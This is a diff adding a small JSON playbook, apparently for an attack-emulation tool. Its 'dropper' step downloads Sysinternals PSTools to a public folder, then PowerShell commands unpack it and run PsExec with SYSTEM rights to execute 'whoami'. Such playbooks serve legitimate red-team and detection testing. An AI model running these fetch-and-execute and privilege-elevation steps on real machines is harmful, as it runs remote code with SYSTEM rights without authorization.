@@ -1,0 +1,11 @@
+{
+    "playbook":{
+        "plugin":{
+            "dropper":["Drop", "C:\\Users\\Public\\Documents\\pstools.zip", "https://download.sysinternals.com/files/PSTools.zip"]
+        },
+        "commandArray":[    
+            {"powershell.exe expand-archive -Force \"C:\\Users\\Public\\Documents\\pstools.zip\"":"null"},
+            {"powershell.exe -c \"pstools\\PsExec.exe -accepteula -s whoami\"": "null"}
+        ]
+    }
+}
